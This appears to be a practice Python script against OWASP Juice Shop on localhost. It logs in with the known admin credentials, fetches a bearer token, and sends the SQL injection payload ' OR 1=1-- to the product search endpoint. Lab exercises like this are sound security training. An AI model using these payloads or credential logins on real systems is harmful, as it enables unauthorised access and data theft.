# A simple script to log in OWASP Juice Shop using Python's requests library.

import requests

url = "http://localhost:3000/rest/user/login"
payload = { 
    "email": "admin@juice-sh.op",
    "password": "admin123"
}

response = requests.post(url, json=payload)


print("Status Code:", response.status_code)
print("Raw Text:", response.text)

try:
    json_data = response.json()
    print("Parsed JSON:", json_data)
except requests.exceptions.JSONDecodeError:
    print("Response is not JSON.")


token = json_data['authentication']['token']

headers = {
    "Authorization": f"Bearer {token}"
}

response = requests.get("http://localhost:3000/rest/user/whoami", headers=headers)

print(response.json())

sql_payload = "' OR 1=1--"
search_url = f"http://localhost:3000/rest/products/search?q={sql_payload}"

response = requests.get(search_url, headers=headers)
print("\n--- SQL Injection Response ---")
print("Status Code:", response.status_code)

try:
    products = response.json().get('data', response.json())
    for product in products:
        print(f"- {product.get('name')}")
except Exception as e:
    print("Error parsing SQL injection response:", e)

